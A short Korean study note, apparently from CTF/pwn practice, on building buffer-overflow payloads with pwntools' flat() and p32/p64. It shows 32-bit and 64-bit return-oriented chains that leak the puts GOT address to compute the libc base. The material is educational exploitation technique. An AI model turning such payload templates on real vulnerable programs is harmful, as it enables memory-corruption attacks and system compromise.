# payload 로 libc base 주소 계산

#### flat() 함수를 이용하면 libc.address 변수를 활용해서 payload 를 간단하게 만들 수 있다.
##### flat() 함수를 이용하면 little endian 문자로 일괄 변환해 준다.
```python
>>> flat("AAAA", 0xdeadbeef, "BBBB")
b'AAAA\xef\xbe\xad\xdeBBBB'
>>> 
```

##### flat() 함수를 이용한 payload 작성
```python
payload = flat(
    'A' * 76,
    elf.plt['puts'],
    elf.sym['vuln_func'],
    elf.got['puts']
)
```

##### p32()와 p64()를 이용한 payload 작성
```python
payload = b"A" * 76
payload += p32(puts_plt)
payload += p32(elf.symbols["vuln_func"])
payload += p32(puts_got)
```


##### 32비트에서 puts.got 주소 leak하는 payload 작성
##### puts(puts.got) 함수 payload 작성 (calling convention 참고 작성)
```python
# 스택 구성 buf[72] + sftp[4] + ret[4] 일 때,
payload = flat(
    'A' * 76,
    elf.plt['puts'],
    elf.sym['vuln_func'],    # ret 주소 위치(ROP할 때는 pr, ppr, pprt 등 가젯 활용)
    elf.got['puts']
)
```


##### 64비트에서 puts.got 주소 leak하는 payload 작성
##### puts(puts.got) 함수 payload 작성 (calling convention 참고 작성)
```python
# buf[64] + sftp[8] + ret[8]
payload = flat(
    b"A" * 72,
    pop_rdi_ret,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['vuln_func'],    # ret 주소 위치(ROP할 때는 pr, ppr, pprt 등 가젯 활용)
)
```
